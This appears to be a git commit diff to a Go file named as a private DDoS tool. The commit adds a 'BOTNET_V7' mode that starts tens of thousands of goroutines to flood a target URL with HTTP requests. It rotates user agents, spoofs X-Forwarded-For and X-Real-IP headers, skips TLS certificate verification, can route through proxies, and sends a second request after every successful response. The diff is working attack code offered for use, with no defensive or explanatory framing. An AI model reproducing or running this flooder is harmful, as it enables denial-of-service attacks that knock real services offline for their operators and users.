f1a76a19bedc00b01bdae66e9aa7c81093d5f358
zemondthepython <127632486+zemondthepython@users.noreply.github.com>
2023-05-20 22:07:32 +0300

    Add files via upload

--- govno1_privat_ddos.go
+++ govno1_privat_ddos.go
@@ -1524,8 +1524,8 @@ for i := 0; i < max_requests_global*16000; i++ {
             IdleConnTimeout:     600 * time.Second,
             TLSClientConfig: &tls.Config{
                 InsecureSkipVerify: true,
-                MaxVersion:         tls.VersionTLS12,
-                MinVersion:         tls.VersionTLS10,
+                MaxVersion:         tls.VersionTLS13,
+                MinVersion:         tls.VersionTLS11,
             },
             DisableKeepAlives:   false, // включена підтримка Keep-Alive
             ResponseHeaderTimeout: time.Second * 60, // таймаут для отримання заголовків від сервера
@@ -1609,6 +1609,118 @@ for i := 0; i < max_requests_global*16000; i++ {
                             req.AddCookie(cookie) // added line to add cookie to request headers
                             req.Header.Set("X-Protocol-Level", "3")
                             req.Header.Set("HTTPS-SYN", "true") // added line for HTTPS-SYN
+                            bot.Do(req)
+                        }
+                        elapsed := time.Since(start)
+                        fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
+                    }
+                }
+            }
+        }(i)
+    }
+    case "BOTNET_V7":
+    paramsData := url.Values{}
+    paramsData.Set("foo", "bar")
+    data := []byte(`{"foo":"bar"}`)
+
+    bot := &http.Client{
+        Timeout: time.Second * 60,
+        Transport: &http.Transport{
+            MaxIdleConns:        5000,
+            MaxIdleConnsPerHost: 5000,
+            IdleConnTimeout:     600 * time.Second,
+            TLSClientConfig: &tls.Config{
+                InsecureSkipVerify: true,
+                MaxVersion:         tls.VersionTLS13,
+                MinVersion:         tls.VersionTLS11,
+            },
+            DisableKeepAlives:   false,
+            ResponseHeaderTimeout: time.Second * 60,
+            ExpectContinueTimeout: 1 * time.Second,
+        },
+    }
+
+    cookie := &http.Cookie{
+        Name:     "auth",
+        Value:    "SECURE_COOKIE_FOO",
+        HttpOnly: true,
+    }
+
+    contentLength := len(data)
+    chunkSize := 35000
+    for i := 0; i < max_requests_global*60000; i++ {
+        wg.Add(1)
+        go func(i int) {
+            defer wg.Done()
+            key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
+            mutex.Lock()
+            cache[key]++
+            mutex.Unlock()
+            r, _ := http.NewRequest(method, urlString, bytes.NewBuffer(data))
+            if proxies != "" {
+                proxyURL, err := url.ParseRequestURI(proxies)
+                if err != nil {
+                    log.Fatalln(err)
+                }
+                transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+                bot.Transport = transport
+            }
+            if i%2 == 0 {
+                r.Header.Set("X-Forwarded-For", "10.0.0.1")
+                r.Header.Set("X-Forwarded-Host", "1.1.1.1")
+                r.Header.Set("X-Forwarded-Proto", "http")
+                r.Header.Set("X-Real-IP", "10.0.1.1")
+            } else {
+                r.Header.Set("X-Forwarded-For", "9.0.0.76")
+                r.Header.Set("X-Forwarded-Host", "9.9.9.9")
+                r.Header.Set("X-Forwarded-Proto", "https")
+                r.Header.Set("X-Real-IP", "9.99.10")
+            }
+            rand.Seed(time.Now().UnixNano())
+            r.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+            r.URL.Scheme = "https"
+            r.Header.Set("Content-Type", "application/json")
+            r.ContentLength = int64(len(data))
+            for j := 0; j < contentLength; j += chunkSize {
+                end := j + chunkSize
+                if end > contentLength {
+                    end = contentLength
+                }
+                chunk := data[j:end]
+                if i%2 == 0 {
+                    buf := make([]byte, 1024)
+                    r.Body = ioutil.NopCloser(bytes.NewReader(buf))
+                } else {
+                    r.Body = ioutil.NopCloser(bytes.NewReader(chunk))
+                    r.ContentLength = int64(len(chunk))
+                }
+                r.Header.Set("Connection", "keep-alive")
+                r.Header.Set("Timeout", "1000")
+                r.Header.Set("X-Protocol-Level", "2")
+                r.Header.Set("Custom-Header", "foo")
+                r.Header.Set("Another-Header", "bar")
+                r.Header.Set("Yet-Another-Header", "baz")
+                start := time.Now()
+                resp, err := bot.Do(r)
+                if err != nil {
+                    log.Printf("Error: %v", err)
+                } else {
+                    defer resp.Body.Close()
+                    if resp.StatusCode == http.StatusOK {
+                        req, err := http.NewRequest(method, urlString, bytes.NewBufferString(paramsData.Encode()))
+                        if err != nil {
+                            log.Printf("Error: %v", err)
+                        } else {
+                            if i%2 == 0 {
+                                req.Header.Set("X-Forwarded-For", "10.0.0.1")
+                            } else {
+                                req.Header.Set("X-Forwarded-For", "9.0.0.1")
+                            }
+                            req.AddCookie(cookie)
+                            req.Header.Set("X-Protocol-Level", "3")
+                            req.Header.Set("HTTPS-SYN", "true")
+                            req.Header.Set("Another-Custom-Header", "foo")
+                            req.Header.Set("Yet-Another-Custom-Header", "bar")
                             bot.Do(req)
                         }
                         elapsed := time.Since(start)
